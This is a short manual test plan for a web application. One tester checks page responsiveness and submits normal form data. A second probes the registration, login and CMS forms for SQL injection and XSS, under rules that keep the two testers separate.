## Intro

There will be two actors involved in two rounds of testing: SimpleUser and ComplexUser, and all testing will be done manually. In general, the tasks will be divided as follows: SimpleUser will be responsible for testing all page size-responsively and all forms with various normal data that will be predetermined by some rule, and ComplexUser will be responsible for testing all forms with various data/Payload XSS and SQLinjection and closely observing the response detail. The testing can be continuously, during the development process until the final phase on April 5-10, 2023. There are some rules to directive the testing process and how to record the testing results, so the testing will be `inflexible`.

The testing with SimpleUser, which attempts to test all forms with various normal data, tends to be more suitable for `black box testing`, where testing is done from the user's point of view or the use of the application without paying attention to internal implementation details. Meanwhile, the testing with ComplexUser, which attempts to test with data/Payload XSS and closely observe the response, tends to be more suitable for `grey box testing`, where testing is done with some knowledge of the design and structure of the application.

## Guideline for SimpleUser

1. Login with Google (Google Auth)

2. Explore the entire page

3. Test the responsiveness of the entire page

4. Test all forms repeatedly

5. Test all forms in various conditions.

## Guideline for ComplexUser

1. Manual Registration and Login

2. Manually test the register form repeatedly for SQLi and XSS vulnerabilities

3. Manually test the login form for SQLi and XSS vulnerabilities

4. Repeatedly test all forms in the CMS

5. Test all forms in various conditions.

## General Rules

1. ComplexUser and SimpleUser are not allowed to exchange information regarding the testing process and results.

2. ComplexUser and SimpleUser are not allowed to be in close proximity to each other while one or both are conducting testing.

3. Testing is conducted manually without the use of automated scripts.

4. If an error occurs during the testing process, testing must continue until it cannot be continued.

5. ComplexUser and SimpleUser must understand the format or guidelines for recording testing results and processes.
